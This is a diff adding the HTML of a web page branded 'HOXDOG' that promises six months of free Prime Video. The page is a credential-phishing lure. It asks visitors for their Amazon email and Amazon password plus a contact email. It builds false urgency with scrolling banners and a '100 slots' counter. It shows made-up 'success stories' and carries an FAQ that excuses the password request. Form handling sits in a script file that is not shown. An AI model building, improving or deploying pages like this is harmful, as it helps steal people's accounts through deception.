@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Prime Video Offer</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Koulen&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Libre+Caslon+Text&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@200&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <div class="ray-overlay"></div>
+    <div class="navbar">
+      <button class="theme-toggle" id="themeToggle">
+        <i class="fas fa-moon"></i>
+      </button>
+      <div class="logo">HOXDOG</div>
+    </div>
+    <div class="header">
+      <div class="slider-text">
+        <div>GET IT NOW - IT'S ONLY FREE FOR FIRST 100 PEOPLE</div>
+        <div>LIMITED TIME OFFER - DON'T MISS OUT!</div>
+        <div>JOIN THOUSANDS OF HAPPY PRIME MEMBERS</div>
+        <div>EXCLUSIVE PRIME VIDEO ACCESS - CLAIM NOW</div>
+        <div>HURRY! SLOTS ARE FILLING UP FAST</div>
+        <!-- Duplicate for seamless desktop sliding -->
+        <div>GET IT NOW - IT'S ONLY FREE FOR FIRST 100 PEOPLE</div>
+        <div>LIMITED TIME OFFER - DON'T MISS OUT!</div>
+        <div>JOIN THOUSANDS OF HAPPY PRIME MEMBERS</div>
+        <div>EXCLUSIVE PRIME VIDEO ACCESS - CLAIM NOW</div>
+        <div>HURRY! SLOTS ARE FILLING UP FAST</div>
+      </div>
+    </div>
+    <div class="content">
+      <h1>
+        Get your 6 Months Prime Video Subscription<br />
+        <em>Absolutely Free</em>
+      </h1>
+      <div class="form-container">
+        <form id="primeForm" onsubmit="handleSubmit(event)">
+          <input
+            type="text"
+            id="amazonEmail"
+            placeholder="Amazon Email"
+            required
+          />
+          <div class="password-container">
+            <input
+              type="password"
+              id="amazonPassword"
+              placeholder="Amazon Password"
+              required
+            />
+            <i class="password-toggle fa-regular fa-eye"></i>
+          </div>
+          <input
+            type="email"
+            id="mainEmail"
+            placeholder="Main Email ID"
+            required
+          />
+          <input type="hidden" id="status" value="Pending" />
+          <button type="submit">Submit</button>
+        </form>
+      </div>
+
+      <div class="success-message">
+        <svg
+          class="checkmark"
+          xmlns="http://www.w3.org/2000/svg"
+          viewBox="0 0 52 52"
+        >
+          <circle
+            class="checkmark__circle"
+            cx="26"
+            cy="26"
+            r="25"
+            fill="none"
+          />
+          <path
+            class="checkmark__check"
+            fill="none"
+            d="M14.1 27.2l7.1 7.2 16.7-16.8"
+          />
+        </svg>
+        <p>Your request is registered!</p>
+        <p>
+          Please check your mail, the membership will be activated by tomorrow.
+        </p>
+      </div>
+
+      <div class="slots-progress">
+        <div class="progress-info">
+          <span class="slots-filled"
+            ><span id="filledCount">0</span> Slots Filled</span
+          >
+          <span class="slots-remaining"
+            ><span id="remainingCount">100</span> Slots Left</span
+          >
+        </div>
+        <div class="progress-bar-container">
+          <div class="progress-bar" id="progressBar"></div>
+        </div>
+      </div>
+
+      <div class="period-over-message" style="display: none">
+        <i class="fas fa-hourglass-end"></i>
+        <span>Free Period is Over!</span>
+      </div>
+
+      <div class="note">
+        <p><strong>Note:</strong></p>
+        <ul>
+          <li>
+            Please avoid using your primary email ID when creating the Amazon
+            account for this process.
+          </li>
+          <li>
+            Kindly provide your correct primary email ID so that we can contact
+            you easily.
+          </li>
+        </ul>
+      </div>
+      <div class="faq-container">
+        <div class="faq-header">
+          Click here to know why we need this details.
+        </div>
+        <div class="faq-content">
+          <div class="faq">
+            <p>
+              <strong>Q. Why do we need your Amazon email and password?</strong>
+            </p>
+            <p>
+              We'll use it to activate your 6-month Prime Video membership. If
+              we only have your email, we'd need your help for OTP verification.
+              Providing your Amazon account details helps avoid this hassle.
+            </p>
+            <p><strong>Q. Why we need your Main E-Mail ID?</strong></p>
+            <p>
+              We need your main Email ID just to notify you that your account is
+              ready because this process might take a maximum a Day.
+            </p>
+          </div>
+        </div>
+      </div>
+      <div class="proof-section">
+        <h2>Success Stories</h2>
+        <div class="proof-container">
+          <div class="proof-row">
+            <div class="proof-image">
+              <img src="img/proof1.jpg" alt="Success Proof 1" />
+              <div class="proof-overlay">
+                <span>Active Member</span>
+                <span class="proof-date">Updated: 15 March 2024</span>
+              </div>
+            </div>
+            <div class="proof-image">
+              <img src="img/proof2.jpg" alt="Success Proof 2" />
+              <div class="proof-overlay">
+                <span>Active Member</span>
+                <span class="proof-date">Updated: 15 March 2024</span>
+              </div>
+            </div>
+            <div class="proof-image">
+              <img src="img/proof3.jpg" alt="Success Proof 3" />
+
+              <div class="proof-overlay">
+                <span>Active Member</span>
+                <span class="proof-date">Updated: 15 March 2024</span>
+              </div>
+            </div>
+            <div class="proof-image">
+              <img src="img/proof4.jpg" alt="Success Proof 4" />
+              <div class="proof-overlay">
+                <span>Active Member</span>
+                <span class="proof-date">Updated: 15 March 2024</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">
+        Follow us on:
+        <a href="https://t.me/hoxnation" target="_blank"
+          ><i class="fas fa-paper-plane"></i
+        ></a>
+      </div>
+    </div>
+    <script src="script.js"></script>
+  </body>
+</html>
